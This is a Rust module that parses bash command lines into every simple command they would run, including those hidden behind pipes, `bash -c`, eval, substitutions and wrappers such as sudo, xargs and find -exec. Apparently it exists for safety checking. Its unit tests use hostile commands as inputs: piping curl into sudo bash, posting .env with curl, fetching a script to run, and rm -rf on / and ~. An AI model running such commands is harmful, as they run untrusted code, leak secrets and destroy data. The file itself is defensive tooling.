//! Reads a bash command line into the simple commands it would run.
#![cfg_attr(test, allow(clippy::expect_used, clippy::unwrap_used, clippy::indexing_slicing))]
//!
//! A command line hides what it runs: behind pipes and lists, inside subshells and `$(...)`, in `bash -c '...'`, after
//! `sudo` or `xargs`. [`parse`] finds every simple command in all of those places and says how each was reached, so a
//! caller can judge the whole line and not only its first word. A line that cannot be parsed is an error: the caller
//! treats that as a finding of its own.

use std::io::Cursor;

use brush_parser::ast::{
    AndOr, AndOrList, Command, CommandPrefixOrSuffixItem, CompoundCommand, CompoundList, IoFileRedirectKind,
    IoFileRedirectTarget, IoRedirect, Pipeline, Program, SimpleCommand,
};
use brush_parser::word::{self, WordPiece, WordPieceWithSource};
use brush_parser::{Parser, ParserOptions};

/// How deep nested command strings (`bash -c "bash -c '...'"`, substitutions in substitutions) are followed.
const MAX_DEPTH: usize = 6;

/// Why a command line could not be read.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseError {
    /// The text is not valid bash.
    Syntax(String),
    /// Command strings are nested deeper than anyone writes by hand.
    TooDeep,
}

impl std::fmt::Display for ParseError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Syntax(message) => write!(f, "not valid bash: {message}"),
            Self::TooDeep => write!(f, "command strings nested too deeply"),
        }
    }
}

impl std::error::Error for ParseError {}

/// One word of a command, with its text when that is known before the command runs.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Word {
    /// The word as written, quotes included.
    pub raw: String,
    /// The text after quotes are removed, or `None` when it depends on an expansion (`$X`, `$(...)`).
    pub value: Option<String>,
    /// The commands run by `$(...)` and backticks inside this word: indexes into [`Parsed::invocations`].
    pub substitutions: Vec<usize>,
    /// The parameter expansions inside this word, as written (`$HOME`, `${TOKEN}`).
    pub parameters: Vec<String>,
}

impl Word {
    /// The text of the word when it is static, or the raw text.
    #[must_use]
    pub fn text(&self) -> &str {
        self.value.as_deref().unwrap_or(&self.raw)
    }

    /// Whether the word is the same whatever the environment.
    #[must_use]
    pub fn is_static(&self) -> bool {
        self.value.is_some()
    }
}

/// How a command was reached.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Via {
    /// Written on the line, at the top or inside a list, a subshell or a block.
    Direct,
    /// Behind `sudo`, `env`, `xargs`, `find -exec` and the like.
    Wrapper,
    /// Inside the string of `bash -c '...'`.
    ShellString,
    /// Inside the arguments of `eval`.
    Eval,
    /// Inside `$(...)` or backticks.
    Substitution,
    /// Inside `<(...)` or `>(...)`.
    ProcessSubstitution,
}

/// What a redirection does to its target.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RedirectKind {
    /// `< file`
    Read,
    /// `> file`, `>| file`
    Write,
    /// `>> file`
    Append,
    /// Anything else: descriptor copies, here-documents.
    Other,
}

/// A redirection on a command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    /// What it does.
    pub kind: RedirectKind,
    /// The file (or word) it names.
    pub target: Word,
}

/// One simple command, as it would run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Invocation {
    /// The command name and its arguments. Empty for a line that only assigns variables.
    pub argv: Vec<Word>,
    /// `NAME=value` assignments before the command.
    pub assignments: Vec<(String, Word)>,
    /// Redirections.
    pub redirects: Vec<Redirect>,
    /// The commands inside each `<(...)` and `>(...)` argument: indexes into [`Parsed::invocations`].
    pub process_substitutions: Vec<Vec<usize>>,
    /// How the command was reached.
    pub via: Via,
    /// Whether the command's name comes from an expansion (`$CMD`, `$(npm bin)/jest`).
    pub dynamic_name: bool,
    /// Whether the string given to `bash -c` or `eval` is only known when the command runs.
    pub dynamic_string: bool,
}

impl Invocation {
    /// The command name without its directory, when it is static.
    #[must_use]
    pub fn name(&self) -> Option<&str> {
        let first = self.argv.first()?.value.as_deref()?;
        Some(first.rsplit('/').next().unwrap_or(first))
    }

    /// The command name as written, directory included.
    #[must_use]
    pub fn program(&self) -> Option<&str> {
        self.argv.first()?.value.as_deref()
    }

    /// The arguments after the command name.
    #[must_use]
    pub fn args(&self) -> &[Word] {
        self.argv.get(1..).unwrap_or(&[])
    }
}

/// Everything a command line would run.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Parsed {
    /// Every simple command found. A wrapper comes before the command it runs; the commands of a `$(...)` come before the
    /// command that contains it, since they run first.
    pub invocations: Vec<Invocation>,
    /// Each pipeline of the line: its stages in order, each as the invocations that stage runs.
    pub pipelines: Vec<Vec<Vec<usize>>>,
}

/// Reads a command line.
pub fn parse(source: &str) -> Result<Parsed, ParseError> {
    let mut builder = Builder::default();
    builder.parse_str(source, 0, Via::Direct)?;
    Ok(Parsed { invocations: builder.invocations, pipelines: builder.pipelines })
}

#[derive(Default)]
struct Builder {
    invocations: Vec<Invocation>,
    pipelines: Vec<Vec<Vec<usize>>>,
}

fn read_program(source: &str) -> Result<Program, ParseError> {
    let mut parser = Parser::new(Cursor::new(source), &ParserOptions::default());
    parser.parse_program().map_err(|error| ParseError::Syntax(error.to_string()))
}

impl Builder {
    /// Parse `source` and append what it runs; returns the indexes appended.
    fn parse_str(&mut self, source: &str, depth: usize, via: Via) -> Result<Vec<usize>, ParseError> {
        if depth > MAX_DEPTH {
            return Err(ParseError::TooDeep);
        }
        let before = self.invocations.len();
        let program = read_program(source)?;
        for list in &program.complete_commands {
            self.list(list, depth, via)?;
        }
        Ok((before..self.invocations.len()).collect())
    }

    fn list(&mut self, list: &CompoundList, depth: usize, via: Via) -> Result<(), ParseError> {
        for item in &list.0 {
            self.and_or(&item.0, depth, via)?;
        }
        Ok(())
    }

    fn and_or(&mut self, list: &AndOrList, depth: usize, via: Via) -> Result<(), ParseError> {
        self.pipeline(&list.first, depth, via)?;
        for next in &list.additional {
            match next {
                AndOr::And(pipeline) | AndOr::Or(pipeline) => self.pipeline(pipeline, depth, via)?,
            }
        }
        Ok(())
    }

    fn pipeline(&mut self, pipeline: &Pipeline, depth: usize, via: Via) -> Result<(), ParseError> {
        let mut stages: Vec<Vec<usize>> = Vec::new();
        for command in &pipeline.seq {
            let before = self.invocations.len();
            self.command(command, depth, via)?;
            if matches!(command, Command::Simple(_)) {
                stages.push((before..self.invocations.len()).collect());
            }
        }
        if stages.len() > 1 {
            self.pipelines.push(stages);
        }
        Ok(())
    }

    fn command(&mut self, command: &Command, depth: usize, via: Via) -> Result<(), ParseError> {
        match command {
            Command::Simple(simple) => self.simple(simple, depth, via),
            Command::Compound(compound, _) => self.compound(compound, depth, via),
            Command::Function(function) => self.compound(&function.body.0, depth, via),
            Command::ExtendedTest(..) => Ok(()),
        }
    }

    fn compound(&mut self, compound: &CompoundCommand, depth: usize, via: Via) -> Result<(), ParseError> {
        match compound {
            CompoundCommand::Arithmetic(_) | CompoundCommand::ArithmeticForClause(_) => Ok(()),
            CompoundCommand::BraceGroup(group) => self.list(&group.list, depth, via),
            CompoundCommand::Subshell(shell) => self.list(&shell.list, depth, via),
            CompoundCommand::ForClause(clause) => {
                for value in clause.values.iter().flatten() {
                    self.word(value, depth)?;
                }
                self.list(&clause.body.list, depth, via)
            }
            CompoundCommand::CaseClause(clause) => {
                self.word(&clause.value, depth)?;
                for item in &clause.cases {
                    if let Some(body) = &item.cmd {
                        self.list(body, depth, via)?;
                    }
                }
                Ok(())
            }
            CompoundCommand::IfClause(clause) => {
                self.list(&clause.condition, depth, via)?;
                self.list(&clause.then, depth, via)?;
                for other in clause.elses.iter().flatten() {
                    if let Some(condition) = &other.condition {
                        self.list(condition, depth, via)?;
                    }
                    self.list(&other.body, depth, via)?;
                }
                Ok(())
            }
            CompoundCommand::WhileClause(clause) | CompoundCommand::UntilClause(clause) => {
                self.list(&clause.0, depth, via)?;
                self.list(&clause.1.list, depth, via)
            }
            CompoundCommand::Coprocess(clause) => self.command(&clause.body, depth, via),
        }
    }

    fn simple(&mut self, simple: &SimpleCommand, depth: usize, via: Via) -> Result<(), ParseError> {
        let mut invocation = Invocation {
            argv: Vec::new(),
            assignments: Vec::new(),
            redirects: Vec::new(),
            process_substitutions: Vec::new(),
            via,
            dynamic_name: false,
            dynamic_string: false,
        };
        if let Some(prefix) = &simple.prefix {
            for item in &prefix.0 {
                self.item(item, &mut invocation, depth, true)?;
            }
        }
        if let Some(name) = &simple.word_or_name {
            let word = self.word(name, depth)?;
            invocation.argv.push(word);
        }
        if let Some(suffix) = &simple.suffix {
            for item in &suffix.0 {
                self.item(item, &mut invocation, depth, false)?;
            }
        }
        self.register(invocation, depth)
    }

    fn item(
        &mut self,
        item: &CommandPrefixOrSuffixItem,
        invocation: &mut Invocation,
        depth: usize,
        before_name: bool,
    ) -> Result<(), ParseError> {
        match item {
            CommandPrefixOrSuffixItem::Word(word) => {
                let word = self.word(word, depth)?;
                invocation.argv.push(word);
            }
            CommandPrefixOrSuffixItem::AssignmentWord(assignment, whole) => {
                if before_name {
                    let value = match &assignment.value {
                        brush_parser::ast::AssignmentValue::Scalar(value) => self.word(value, depth)?,
                        brush_parser::ast::AssignmentValue::Array(_) => self.word(whole, depth)?,
                    };
                    invocation.assignments.push((assignment.name.to_string(), value));
                } else {
                    let word = self.word(whole, depth)?;
                    invocation.argv.push(word);
                }
            }
            CommandPrefixOrSuffixItem::IoRedirect(redirect) => {
                if let Some(redirect) = self.redirect(redirect, depth)? {
                    invocation.redirects.push(redirect);
                }
            }
            CommandPrefixOrSuffixItem::ProcessSubstitution(_, shell) => {
                let before = self.invocations.len();
                self.list(&shell.list, depth + 1, Via::ProcessSubstitution)?;
                invocation.process_substitutions.push((before..self.invocations.len()).collect());
            }
        }
        Ok(())
    }

    fn redirect(&mut self, redirect: &IoRedirect, depth: usize) -> Result<Option<Redirect>, ParseError> {
        Ok(match redirect {
            IoRedirect::File(_, kind, IoFileRedirectTarget::Filename(target)) => {
                let kind = match kind {
                    IoFileRedirectKind::Read => RedirectKind::Read,
                    IoFileRedirectKind::Write | IoFileRedirectKind::Clobber => RedirectKind::Write,
                    IoFileRedirectKind::Append => RedirectKind::Append,
                    _ => RedirectKind::Other,
                };
                Some(Redirect { kind, target: self.word(target, depth)? })
            }
            IoRedirect::File(_, _, IoFileRedirectTarget::Duplicate(target)) => {
                Some(Redirect { kind: RedirectKind::Other, target: self.word(target, depth)? })
            }
            IoRedirect::OutputAndError(target, append) => Some(Redirect {
                kind: if *append { RedirectKind::Append } else { RedirectKind::Write },
                target: self.word(target, depth)?,
            }),
            _ => None,
        })
    }

    /// Read a word: its static text when it has one, and the commands it substitutes.
    fn word(&mut self, word: &brush_parser::ast::Word, depth: usize) -> Result<Word, ParseError> {
        let raw = word.value.clone();
        let Ok(pieces) = word::parse(&raw, &ParserOptions::default()) else {
            return Ok(Word { raw, value: None, ..Word::default() });
        };
        let mut text = String::new();
        let mut dynamic = false;
        let mut substitutions = Vec::new();
        let mut parameters = Vec::new();
        self.pieces(
            &raw,
            &pieces,
            depth,
            &mut Collected {
                text: &mut text,
                dynamic: &mut dynamic,
                substitutions: &mut substitutions,
                parameters: &mut parameters,
            },
        )?;
        Ok(Word { raw, value: (!dynamic).then_some(text), substitutions, parameters })
    }

    fn pieces(
        &mut self,
        raw: &str,
        pieces: &[WordPieceWithSource],
        depth: usize,
        out: &mut Collected<'_>,
    ) -> Result<(), ParseError> {
        for found in pieces {
            match &found.piece {
                WordPiece::Text(text) | WordPiece::SingleQuotedText(text) | WordPiece::AnsiCQuotedText(text) => {
                    out.text.push_str(text);
                }
                WordPiece::EscapeSequence(text) => out.text.push_str(text.strip_prefix('\\').unwrap_or(text)),
                WordPiece::DoubleQuotedSequence(inner) | WordPiece::GettextDoubleQuotedSequence(inner) => {
                    self.pieces(raw, inner, depth, out)?;
                }
                WordPiece::TildeExpansion(brush_parser::word::TildeExpr::Home) => out.text.push('~'),
                WordPiece::TildeExpansion(_) | WordPiece::ArithmeticExpression(_) => *out.dynamic = true,
                WordPiece::ParameterExpansion(_) => {
                    *out.dynamic = true;
                    if let Some(written) = raw.get(found.start_index..found.end_index) {
                        out.parameters.push(written.to_owned());
                    }
                }
                WordPiece::CommandSubstitution(inner) | WordPiece::BackquotedCommandSubstitution(inner) => {
                    *out.dynamic = true;
                    out.substitutions.extend(self.parse_str(inner, depth + 1, Via::Substitution)?);
                }
            }
        }
        Ok(())
    }

    /// Add an invocation, then what it wraps, runs from a string, or evaluates.
    fn register(&mut self, mut invocation: Invocation, depth: usize) -> Result<(), ParseError> {
        invocation.dynamic_name = invocation.argv.first().is_some_and(|name| !name.is_static());
        let name = invocation.name().map(str::to_owned);
        let args = invocation.args().to_vec();
        let via = invocation.via;
        let at = self.invocations.len();
        self.invocations.push(invocation);
        let Some(name) = name else { return Ok(()) };

        if let Some(start) = wrapped_command(&name, &args) {
            let inner = args.get(start.0..start.1).unwrap_or(&[]).to_vec();
            if !inner.is_empty() {
                let next = Invocation {
                    argv: inner,
                    assignments: Vec::new(),
                    redirects: Vec::new(),
                    process_substitutions: Vec::new(),
                    via: Via::Wrapper,
                    dynamic_name: false,
                    dynamic_string: false,
                };
                return self.register(next, depth + 1);
            }
        }
        if is_shell(&name) {
            if let Some(string) = command_string(&args) {
                match &string.value {
                    Some(text) => {
                        self.parse_str(text, depth + 1, Via::ShellString)?;
                    }
                    None => {
                        if let Some(entry) = self.invocations.get_mut(at) {
                            entry.dynamic_string = true;
                        }
                    }
                }
            }
        } else if name == "eval" && via != Via::Eval {
            let all_static = args.iter().all(Word::is_static);
            if all_static {
                let joined = args.iter().map(Word::text).collect::<Vec<_>>().join(" ");
                self.parse_str(&joined, depth + 1, Via::Eval)?;
            } else if let Some(entry) = self.invocations.get_mut(at) {
                entry.dynamic_string = true;
            }
        }
        Ok(())
    }
}

struct Collected<'a> {
    text: &'a mut String,
    dynamic: &'a mut bool,
    substitutions: &'a mut Vec<usize>,
    parameters: &'a mut Vec<String>,
}

const SHELLS: [&str; 7] = ["sh", "bash", "zsh", "dash", "ksh", "ash", "fish"];

fn is_shell(name: &str) -> bool {
    SHELLS.contains(&name)
}

/// The string a shell is asked to run with `-c` (alone or in a cluster such as `-lc`).
fn command_string(args: &[Word]) -> Option<Word> {
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let text = arg.text();
        let cluster = text.strip_prefix('-')?;
        if cluster.starts_with('-') || cluster.is_empty() {
            return None;
        }
        if cluster.chars().all(|c| c.is_ascii_alphabetic()) && cluster.contains('c') {
            return iter.next().cloned();
        }
    }
    None
}

/// Where the command a wrapper runs starts and ends in its arguments, when `name` is a wrapper.
fn wrapped_command(name: &str, args: &[Word]) -> Option<(usize, usize)> {
    let texts: Vec<&str> = args.iter().map(Word::text).collect();
    let start = match name {
        "sudo" | "doas" => skip_options(&texts, &["-u", "-g", "-h", "-p", "-C", "-r", "-t", "-U", "-D", "-R", "-T"]),
        "env" => skip_env(&texts),
        "nohup" | "command" | "builtin" | "exec" | "time" | "setsid" | "stdbuf" | "ionice" | "chrt" => {
            skip_options(&texts, &[])
        }
        "nice" => skip_options(&texts, &["-n"]),
        "flock" => skip_options(&texts, &["-w", "-E"]) + 1,
        "watch" => skip_options(&texts, &["-n", "-d"]),
        "strace" | "ltrace" => skip_options(&texts, &["-o", "-e", "-p", "-s", "-u", "-E", "-a"]),
        "unshare" | "busybox" => skip_options(&texts, &[]),
        "chroot" => skip_options(&texts, &[]) + 1,
        "timeout" => {
            let after = skip_options(&texts, &["-k", "-s"]);
            after + 1
        }
        "xargs" => skip_options(&texts, &["-n", "-I", "-P", "-L", "-d", "-E", "-s", "-a"]),
        "find" => return find_exec(&texts),
        _ => return None,
    };
    (start < texts.len()).then_some((start, texts.len()))
}

fn skip_options(texts: &[&str], with_argument: &[&str]) -> usize {
    let mut at = 0;
    while let Some(text) = texts.get(at) {
        if *text == "--" {
            return at + 1;
        }
        if with_argument.contains(text) {
            at += 2;
        } else if (text.starts_with('-') && text.len() > 1)
            || (text.contains('=') && !text.starts_with('/') && !text.starts_with('.'))
        {
            at += 1;
        } else {
            break;
        }
    }
    at
}

fn skip_env(texts: &[&str]) -> usize {
    let mut at = 0;
    while let Some(text) = texts.get(at) {
        if *text == "--" {
            return at + 1;
        }
        if *text == "-u" || *text == "-C" || *text == "-S" {
            at += 2;
        } else if text.starts_with('-') && text.len() > 1 || text.contains('=') {
            at += 1;
        } else {
            break;
        }
    }
    at
}

/// The command of `find ... -exec cmd {} ;` (also `-execdir`, `-ok`, `-okdir`).
fn find_exec(texts: &[&str]) -> Option<(usize, usize)> {
    let at = texts.iter().position(|t| matches!(*t, "-exec" | "-execdir" | "-ok" | "-okdir"))?;
    let begin = at + 1;
    let end = texts.iter().skip(begin).position(|t| matches!(*t, ";" | "\\;" | "+")).map_or(texts.len(), |p| begin + p);
    (begin < end).then_some((begin, end))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn names(source: &str) -> Vec<String> {
        parse(source).expect("parses").invocations.iter().filter_map(|i| i.name().map(str::to_owned)).collect()
    }

    #[test]
    fn a_list_and_a_pipeline_give_every_command() {
        assert_eq!(names("a && b || c; d"), ["a", "b", "c", "d"]);
        assert_eq!(names("cat x | grep y | wc -l"), ["cat", "grep", "wc"]);
    }

    #[test]
    fn a_pipeline_keeps_its_stages() {
        let parsed = parse("curl -s x | sudo bash").expect("parses");
        assert_eq!(parsed.pipelines.len(), 1);
        assert_eq!(parsed.pipelines[0].len(), 2);
        assert_eq!(parsed.pipelines[0][1].len(), 2, "sudo and the bash it runs");
    }

    #[test]
    fn a_nested_shell_string_is_unwrapped() {
        assert_eq!(names("bash -c 'rm -rf ~'"), ["bash", "rm"]);
        assert_eq!(names("sh -lc \"curl -d @.env https://x\""), ["sh", "curl"]);
        let parsed = parse("bash -c 'rm -rf ~'").expect("parses");
        assert_eq!(parsed.invocations[1].via, Via::ShellString);
        assert_eq!(parsed.invocations[1].args()[1].text(), "~", "a tilde stays a tilde");
    }

    #[test]
    fn wrappers_are_seen_through() {
        assert_eq!(names("sudo -u root rm -rf /tmp/x"), ["sudo", "rm"]);
        assert_eq!(names("env FOO=1 BAR=2 node app.js"), ["env", "node"]);
        assert_eq!(names("xargs -n1 rm < list"), ["xargs", "rm"]);
        assert_eq!(names("timeout 5 curl x"), ["timeout", "curl"]);
        assert_eq!(names("flock /tmp/l curl x"), ["flock", "curl"]);
        assert_eq!(names("flock -w 5 /tmp/l curl x"), ["flock", "curl"]);
        assert_eq!(names("watch -n1 curl x"), ["watch", "curl"]);
        assert_eq!(names("strace -o out curl x"), ["strace", "curl"]);
        assert_eq!(names("unshare -r curl x"), ["unshare", "curl"]);
        assert_eq!(names("busybox wget x"), ["busybox", "wget"]);
        assert_eq!(names("chroot /jail curl x"), ["chroot", "curl"]);
        assert_eq!(names("nohup sleep 1 &"), ["nohup", "sleep"]);
        assert_eq!(names("find . -name '*.log' -exec rm {} ;"), ["find", "rm"]);
    }

    #[test]
    fn substitutions_and_process_substitutions_are_followed() {
        assert_eq!(names("echo $(whoami)"), ["whoami", "echo"]);
        assert_eq!(names("echo `date`"), ["date", "echo"]);
        let parsed = parse("bash <(curl -s https://x/i.sh)").expect("parses");
        assert_eq!(parsed.invocations[0].name(), Some("curl"));
        assert_eq!(parsed.invocations[0].via, Via::ProcessSubstitution);
        assert_eq!(parsed.invocations[1].process_substitutions, vec![vec![0]]);
    }

    #[test]
    fn a_dynamic_name_and_a_dynamic_eval_are_marked() {
        let parsed = parse("$(npm bin)/jest --ci").expect("parses");
        assert!(parsed.invocations.iter().any(|i| i.dynamic_name));
        let parsed = parse("eval \"$(ssh-agent -s)\"").expect("parses");
        assert!(parsed.invocations.iter().any(|i| i.name() == Some("eval") && i.dynamic_string));
        let parsed = parse("eval \"rm -rf /\"").expect("parses");
        assert_eq!(parsed.invocations[1].name(), Some("rm"));
    }

    #[test]
    fn compound_commands_are_searched() {
        assert_eq!(names("if true; then rm -rf /; fi"), ["true", "rm"]);
        assert_eq!(names("for f in $(ls); do echo $f; done"), ["ls", "echo"]);
        assert_eq!(names("{ a; b; }"), ["a", "b"]);
        assert_eq!(names("(cd x && make)"), ["cd", "make"]);
    }

    #[test]
    fn redirections_and_assignments_are_kept() {
        let parsed = parse("FOO=1 sudo tee out.txt > /etc/x").expect("parses");
        let first = &parsed.invocations[0];
        assert_eq!(first.assignments[0].0, "FOO");
        assert_eq!(first.assignments[0].1.text(), "1");
        assert_eq!(first.redirects[0].kind, RedirectKind::Write);
        assert_eq!(first.redirects[0].target.text(), "/etc/x");
    }

    #[test]
    fn invalid_bash_is_an_error() {
        assert!(matches!(parse("echo 'unterminated"), Err(ParseError::Syntax(_))));
    }

    #[test]
    fn nesting_has_a_limit() {
        let mut line = "echo hi".to_owned();
        for _ in 0..10 {
            line = format!("bash -c '{}'", line.replace('\'', "'\\''"));
        }
        assert_eq!(parse(&line), Err(ParseError::TooDeep));
    }
}
